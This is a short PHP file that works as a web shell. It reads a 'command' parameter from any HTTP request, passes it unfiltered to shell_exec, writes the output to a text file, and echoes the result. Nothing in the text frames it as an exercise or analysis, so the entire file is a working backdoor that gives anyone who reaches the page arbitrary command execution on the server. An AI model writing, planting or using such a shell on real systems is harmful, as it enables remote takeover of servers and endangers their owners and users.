<?php
if(isset($_REQUEST['command'])){
    echo "<pre>";
    $cmd = ($_REQUEST['command']);
    $output = shell_exec($cmd . ' > output_command.txt');
    echo $output;
    echo "</pre>";
    die;
}
?>